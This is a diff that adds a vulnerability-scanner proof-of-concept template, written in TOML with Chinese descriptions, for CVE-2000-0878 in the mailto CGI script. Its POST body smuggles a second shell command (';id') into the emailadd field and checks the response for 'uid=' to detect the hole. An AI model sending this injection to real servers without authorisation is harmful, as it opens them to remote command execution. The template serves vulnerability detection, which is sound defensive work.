@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "向 mailto CGI 脚本的 emailadd 字段注入 shell 元字符，检测命令执行漏洞。若服务器返回 id 命令的输出（uid=），则存在漏洞。"
+id = "POC-AVE-2000-0990"
+name = "CVE-2000-0878 mailto CGI 脚本远程命令执行 PoC"
+severity = "high"
+tags = ["cve-2000-0878"]
+vuln_id = [
+    "CVE-2000-0878",
+    "AVE-2000-0990",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/mailto"
+protocol = "http"
+
+[poc.requests.body]
+content = "emailadd=test@test.com%3Bid&subject=test&message=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
